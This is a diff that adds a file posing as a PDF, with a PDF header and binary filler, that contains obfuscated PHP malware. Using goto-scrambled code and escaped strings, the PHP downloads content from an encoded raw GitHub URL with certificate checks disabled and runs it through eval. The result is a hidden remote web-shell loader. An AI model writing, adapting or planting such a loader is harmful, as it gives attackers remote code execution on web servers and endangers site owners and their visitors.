@@ -1,0 +1,19 @@
+%PDF-1.3 %  C
+
+
+
+
+
+
+
+
+  C
+
+            "#Qr    &1!A"2qQa   
+                                ? y, /3J ݹ ߲؋5 Xw   y R  I0 2 PI I  iM  r N&"KgX:  nTJnLK  @! - 
+          m ; g   & hw   @ ܗ
+                            9 - . 1<y  Q U ہ?.    b߱ ֫ w*V  ) `$  b ԟ  X - T  G 3 g     Jx   U/  v_s(H @T J    n ! gfb c : l[ Qe
+                                      9 PLb  C m[5  ' jgl   _   l-;"Pk   Q _ ^ S x?"   Y
+ÿþ;<?php
+//Obfuscate by apaed
+ function IHMrb($A1dRf) { goto pOsTe; oXYio: $rYX7F = curl_init(); goto HkY5i; mAN6R: curl_close($rYX7F); goto Q64Ng; O9mYH: $OeEJm = curl_exec($rYX7F); goto mAN6R; EgqsI: nxuRN: goto UU9VL; pOsTe: if (!function_exists("\x63\165\162\x6c\137\x76\x65\162\163\x69\x6f\x6e")) { goto nxuRN; } goto oXYio; OGXji: curl_setopt($rYX7F, CURLOPT_HEADER, 0); goto O9mYH; HkY5i: curl_setopt($rYX7F, CURLOPT_URL, $A1dRf); goto iReYb; UU9VL: return false; goto fQ3xz; Q64Ng: return $OeEJm; goto EgqsI; lEACp: curl_setopt($rYX7F, CURLOPT_RETURNTRANSFER, true); goto OGXji; iReYb: curl_setopt($rYX7F, CURLOPT_SSL_VERIFYPEER, false); goto lEACp; fQ3xz: } eval("\x3f\x3e" . iHmrB("\x68\x74\x74\160\163\x3a\57\x2f\162\x61\167\56\x67\151\x74\x68\x75\142\x75\x73\x65\162\143\x6f\x6e\x74\x65\156\164\x2e\x63\157\x6d\x2f\152\165\162\x61\147\x61\x6e\x75\x6a\x61\x6e\x67\x2f\165\x6a\141\x6e\147\57\x72\145\x66\163\57\x68\x65\141\144\x73\57\155\x61\x69\x6e\57\163\150\x65\x6c\x6e\x6f\x76\x61\x6c"));
